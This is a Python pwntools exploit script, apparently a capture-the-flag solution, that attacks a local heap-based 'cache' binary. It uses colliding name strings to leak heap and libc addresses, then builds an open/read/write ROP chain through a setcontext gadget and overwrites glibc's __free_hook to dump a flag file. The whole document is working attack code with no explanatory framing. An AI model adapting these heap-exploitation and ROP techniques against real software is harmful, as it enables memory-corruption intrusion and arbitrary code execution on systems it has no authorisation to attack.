from pwn import *

io = process('./cache')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

string1 = b'\xc2\xc4\x86\x14\x89k\xea\xc4\xc2\xc4\x86\x14\x89k\xea\xc4'
string2 = b'\xc2\xc4\xc9\xfa\xed\x85B6\xc2\xc4\xc9\xfa\xed\x85B6'

def create(name, size):
    print(io.recvuntil(b'> '))
    io.sendline(b'1')
    print(io.recvuntil(b'Name: '))
    io.sendline(name)
    print(io.recvuntil(b'Size: '))
    io.sendline(str(size))

def view(name, offset, count):
    print(io.recvuntil(b'> '))
    io.sendline(b'2')
    print(io.recvuntil(b'Name: '))
    io.sendline(name)
    print(io.recvuntil(b'Offset: '))
    io.sendline(str(offset))
    print(io.recvuntil(b'Count: '))
    io.sendline(str(count))

def write(name, offset, count, data):
    print(io.recvuntil(b'> '))
    io.sendline(b'3')
    print(io.recvuntil(b'Name: '))
    io.sendline(name)
    print(io.recvuntil(b'Offset: '))
    io.sendline(str(offset))
    print(io.recvuntil(b'Count: '))
    io.sendline(str(count))
    print(io.recvuntil(b'Data: '))
    io.send(data)

def erase(name):
    print(io.recvuntil(b'> '))
    io.sendline(b'4')
    print(io.recvuntil(b'Name: '))
    io.sendline(name)


# Leak heap
create(b'1', 20)
create(b'2', 20)
write(b'1', 0, 1, b'1')
write(b'2', 0, 1, b'2')
erase(b'1')
create(string1, 1)
write(string1, 0, 1, b'1')
create(string2, 0x30)
view(string2, 0, 0x28)
print(io.recv(0x20))
heapbase = u64(io.recv(8)) - 0x11eb0
print(hex(heapbase))
erase(string1)
erase(string2)
create(b'3', 20)
write(b'3', 0, 1, b'3')
create(b'4', 20)
write(b'4', 0, 1, b'4')
create(b'5', 20)
write(b'5', 0, 1, b'5')



# Leak libc
create(b'A', 0x500)
write(b'A', 0, 5, b'AAAAA')
create(b'B', 0x40)
write(b'B', 0, 5, b'BBBBB')
erase(b'A')
create(string1, 1)
write(string1, 0, 1, b'\xe0')
create(string2, 20)
view(string2, 0, 16)
io.recv(8)
libc.address = u64(io.recv(8)) - 0x1c6be0 - 0x25000
erase(string1)
erase(string2)
create(b'C', 20)
write(b'C', 0, 1, b'C')
create(b'D', 20)
write(b'D', 0, 1, b'D')
create(b'E', 20)
write(b'E', 0, 1, b'E')
create(b'F', 0x340)
write(b'F', 0, 1, b'F')


pop_rdi = libc.address + 0x26b72
pop_rsi = libc.address + 0x27529
pop_rdx_r12 = libc.address + 0x11c371
push_rax = libc.address + 0x45197
pop_rax = libc.address + 0x4a550
xchg_eax_edi = libc.address + 0x2ad2b
syscall_ret = libc.address + 0x66229
setcontext_gadget = libc.address + 0x580dd
base = heapbase + 76080
payload = b"A"*7+b"\0"                  # <-- [rdi] <-- payload_base
payload += p64(base)              # <-- [rdi + 8] = rdx
payload += b"B"*0x10              # padding
payload += p64(setcontext_gadget) # <-- [rdx + 0x20]
payload += p64(0)                 # <-- [rdx + 0x28] = r8
payload += p64(0)                 # <-- [rdx + 0x30] = r9
payload += b"A"*0x10              # padding
payload += p64(0)                 # <-- [rdx + 0x48] = r12
payload += p64(0)                 # <-- [rdx + 0x50] = r13
payload += p64(0)                 # <-- [rdx + 0x58] = r14
payload += p64(0)                 # <-- [rdx + 0x60] = r15
payload += p64(base + 0x158)      # <-- [rdx + 0x68] = rdi (ptr to flag path)
payload += p64(0)                 # <-- [rdx + 0x70] = rsi (flag = O_RDONLY)
payload += p64(0)                 # <-- [rdx + 0x78] = rbp
payload += p64(0)                 # <-- [rdx + 0x80] = rbx
payload += p64(0)                 # <-- [rdx + 0x88] = rdx
payload += b"A"*8                 # padding
payload += p64(0)                 # <-- [rdx + 0x98] = rcx
payload += p64(base + 0xb0)      # <-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain
payload += p64(pop_rax)           # <-- [rdx + 0xa8] = rcx, will be pushed to rsp
payload += p64(2)
payload += p64(syscall_ret) # sys_open("/path/to/flag", O_RDONLY)
payload += p64(xchg_eax_edi)
payload += p64(pop_rsi)
payload += p64(heapbase + 0x10000) # destination buffer, can be anywhere readable and writable
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret) # sys_read(eax, heap + 0x15000, 0x100)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(heapbase + 0x10000) # buffer
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall_ret) # sys_write(1, heap + 0x15000, 0x100)
payload += b"/home/user/flag.txt\0\0"

#payload chunk

create(string1, 0x18)
write(string1, 0, 3, b'AAA')
create(b'AAAAAAA', 0x300)
write(b'AAAAAAA', 0, len(payload), payload)
create(string2, 0x30)
overwrite = p64(0)*3+p64(0x41)+p64(heapbase+75840)+p64(heapbase+76080)
write(string1, 0, 0x30, overwrite)
erase(string1)
erase(string2)
create(b'NOPE1', 0x18)
write(b'NOPE1', 0, 1, b'N')
create(b'NOPE2', 0x18)
write(b'NOPE2', 0, 1, b'N')
create(b'NOPE3', 0x18)
write(b'NOPE3', 0, 1, b'N')
create(b'NOPE4', 0x68)
write(b'NOPE4', 0, 1, b'N')
create(b'NOPE5', 0x68)
write(b'NOPE5', 0, 1, b'N')
#


create(b'DUMMY1', 0x88)
write(b'DUMMY1', 0, 6, b'DUMMY1')
create(b'DUMMY2', 0x88)
write(b'DUMMY2', 0, 6, b'DUMMY2')
create(b'DUMMY3', 0x88)
write(b'DUMMY3', 0, 6, b'DUMMY3')
erase(b'DUMMY1')
erase(b'DUMMY2')
erase(b'DUMMY3')
create(string1, 0x18)
write(string1, 0, 6, b'AAAAAA')
create(b'TARGET', 0x68)
write(b'TARGET', 0, 6, b'BBBBBB')
create(b'FOOLER', 0x68)
write(b'FOOLER', 0, 6, b'FOOLER')
create(string2, 0x60)
erase(b'FOOLER')
erase(b'TARGET')
payload2 = p64(0x41)*2+p64(0)+p64(0x71)+p64(libc.sym['__free_hook'])
write(string1, 0, len(payload2), payload2)
create(b'PADDING1', 0x68)
write(b'PADDING1', 0, 8, p64(0x41))
create(b'FREEHOOK', 0x68)
write(b'FREEHOOK', 0, 8, p64(libc.address+0x154930))
erase(b'AAAAAAA')


print(io.recvall())
